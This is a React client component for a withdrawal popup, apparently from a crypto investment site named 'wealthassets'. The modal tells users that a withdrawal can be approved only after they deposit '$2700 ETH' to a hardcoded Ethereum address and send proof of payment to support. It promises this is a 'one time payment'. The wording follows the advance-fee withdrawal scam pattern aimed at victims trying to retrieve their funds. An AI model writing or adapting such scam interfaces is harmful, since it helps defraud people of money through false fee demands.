"use client"
import { useWalletStore } from "@/store/wallets";
import { Information } from "iconsax-react";

//Import Needed Icons

const SendPopup = ({ message }: string | any) => {

    const { depositMessage } = useWalletStore();

    return (
        <main className="fixed h-screen w-full bg-black bg-opacity-80 flex items-center justify-center z-[100] top-0 left-0 text-xs md:text-sm xl:text-base">
            <div className="relative w-[90%] sm:w-[70%] md:w-[60%] lg:w-[50%] 2xl:w-[40%] bg-white p-4 sm:p-6 md:p-8 lg:p-10 xl:p-12 rounded-lg">
                {!message && !depositMessage &&
                    <>
                        <p>In order to proceed with the approval of your withdrawal, it is necessary that you must have an Ethereum balance of at least <span className="font-semibold">$2700 ETH</span>, which will enable the authorization of your transaction to be approved. <br /> Please ensure that you  must have this balance to facilitate a prompt withdrawal.</p>
                        <p className="my-6"><span className="font-semibold text-primary break-all">0x704b7507052EC1a52E39460f8929D8FBf42516C9</span> <br /><br />Here is your <span className="font-medium">Ethereum ERC20 wallet address</span>  on wealthassets where you are to deposit $2700 ETH into. <br /><br /> After you have made the payment, kindly reach out to our support team with proof of payment so that we can authorize your withdrawal without delay.</p>
                        <div className="flex gap-x-1 mt-6">
                            <Information size="20" className="text-red-600 shrink-0 mt-0.5" variant="Bold" />
                            <p><span className="text-red-600 font-semibold">Please Note: </span>This is a one time payment and you&apos;ll never be asked for any further payments for any kind of transactions anymore. Thanks for your understanding.</p>
                        </div>
                    </>
                }

            </div>
        </main>
    );
}

export default SendPopup;